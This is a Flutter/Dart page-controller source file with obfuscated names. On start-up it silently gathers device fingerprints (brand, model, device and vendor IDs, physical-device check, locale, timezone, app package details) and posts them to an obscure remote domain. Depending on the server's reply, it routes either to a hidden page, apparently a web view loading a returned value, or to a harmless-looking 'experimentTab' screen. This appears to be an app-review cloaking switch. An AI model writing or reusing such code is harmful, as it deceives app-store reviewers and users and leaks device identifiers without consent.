import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var rulqnfgyx = RxBool(false);
  var ncsrtbpfu = RxBool(true);
  var xqamtivn = RxString("");
  var maurine = RxBool(false);
  var koepp = RxBool(true);
  final axicdhj = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    bsnycr();
  }


  Future<void> bsnycr() async {

    maurine.value = true;
    koepp.value = true;
    ncsrtbpfu.value = false;

    axicdhj.post("https://qus.delunodep.xyz/wU8kUZuNpo3BV",data: await acbxlvzku()).then((value) {
      var kmdt = value.data["kmdt"] as String;
      var ctqf = value.data["ctqf"] as bool;
      if (ctqf) {
        xqamtivn.value = kmdt;
        vanessa();
      } else {
        shields();
      }
    }).catchError((e) {
      ncsrtbpfu.value = true;
      koepp.value = true;
      maurine.value = false;
    });
  }

  Future<Map<String, dynamic>> acbxlvzku() async {
    final DeviceInfoPlugin bnofvhi = DeviceInfoPlugin();
    PackageInfo hxjatpei_qldgkep = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bapcskil = Platform.localeName;
    var VJzWrQln = currentTimeZone;

    var XHauQ = hxjatpei_qldgkep.packageName;
    var dToJwqA = hxjatpei_qldgkep.version;
    var IChri = hxjatpei_qldgkep.buildNumber;

    var MUDVhOE = hxjatpei_qldgkep.appName;
    var zKYFcWNH = "";
    var nhDHeF  = "";
    var SFVCLrfY = "";
    var efrenGreenholt = "";
    var letaTrantow = "";
    var aldenAbshire = "";
    var meaghanGraham = "";
    var oraLowe = "";
    var darylFunk = "";
    var maeveRuecker = "";

    var madonnaSchowalter = "";

    var CIkTcW = "";
    var VAhrNLGp = false;

    if (GetPlatform.isAndroid) {
      CIkTcW = "android";
      var upidqbrlg = await bnofvhi.androidInfo;

      SFVCLrfY = upidqbrlg.brand;

      zKYFcWNH  = upidqbrlg.model;
      nhDHeF = upidqbrlg.id;

      VAhrNLGp = upidqbrlg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      CIkTcW = "ios";
      var vzijyuor = await bnofvhi.iosInfo;
      SFVCLrfY = vzijyuor.name;
      zKYFcWNH = vzijyuor.model;

      nhDHeF = vzijyuor.identifierForVendor ?? "";
      VAhrNLGp  = vzijyuor.isPhysicalDevice;
    }
    var res = {
      "MUDVhOE": MUDVhOE,
      "IChri": IChri,
      "XHauQ": XHauQ,
      "zKYFcWNH": zKYFcWNH,
      "dToJwqA": dToJwqA,
      "maeveRuecker" : maeveRuecker,
      "VJzWrQln": VJzWrQln,
      "nhDHeF": nhDHeF,
      "bapcskil": bapcskil,
      "CIkTcW": CIkTcW,
      "oraLowe" : oraLowe,
      "VAhrNLGp": VAhrNLGp,
      "efrenGreenholt" : efrenGreenholt,
      "SFVCLrfY": SFVCLrfY,
      "letaTrantow" : letaTrantow,
      "aldenAbshire" : aldenAbshire,
      "meaghanGraham" : meaghanGraham,
      "madonnaSchowalter" : madonnaSchowalter,
      "darylFunk" : darylFunk,

    };
    return res;
  }

  Future<void> shields() async {
    Get.offAllNamed("/experimentTab");
  }

  Future<void> vanessa() async {
    Get.offAllNamed("/expGp");
  }

}
